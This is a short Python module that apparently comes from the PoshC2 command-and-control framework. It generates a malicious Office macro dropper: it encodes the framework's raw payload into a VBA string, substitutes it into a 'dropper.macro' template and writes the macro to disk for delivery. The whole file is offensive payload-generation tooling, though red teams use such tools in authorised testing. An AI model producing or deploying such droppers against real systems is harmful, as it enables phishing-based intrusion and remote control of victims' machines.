from poshc2.server.Config import PayloadTemplatesDirectory
from poshc2.Colours import Colours
from poshc2.Utils import formStrMacro


def create_payloads(payloads, name):
    payloads.QuickstartLog(Colours.END)
    payloads.QuickstartLog(f"Macro Payload written to: {payloads.BaseDirectory}{name}macro.txt")

    strmacro = formStrMacro("str", str(payloads.CreateRawBase()))
    with open(f"{PayloadTemplatesDirectory}dropper.macro", 'r') as f:
        content = f.read()
    content = str(content).replace("#REPLACEME#", strmacro)

    with open(f"{payloads.BaseDirectory}{name}macro.txt", 'w') as f:
        f.write(content)
